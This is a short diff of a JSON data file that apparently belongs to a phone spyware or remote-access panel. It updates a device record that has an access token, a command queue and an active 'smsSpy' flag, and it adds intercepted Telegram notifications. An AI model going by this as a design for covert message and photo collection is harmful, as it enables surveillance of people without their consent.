@@ -3031,7 +3031,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "cf99cabf9358fc617b7c22cc76eb4cb3",
-    "lastSeen": 1776752805706,
+    "lastSeen": 1776752811694,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-20T19:20:24.863Z",
@@ -3102,6 +3102,14 @@
     },
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 13:26",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776752811962
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram: Pengguna",
@@ -7093,14 +7101,6 @@
         "time": "21/04 11:43",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776746641454
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram: Pengguna",
-        "content": "Pesan baru",
-        "time": "21/04 11:43",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776746641332
       }
     ],
     "galleryPhotos": [
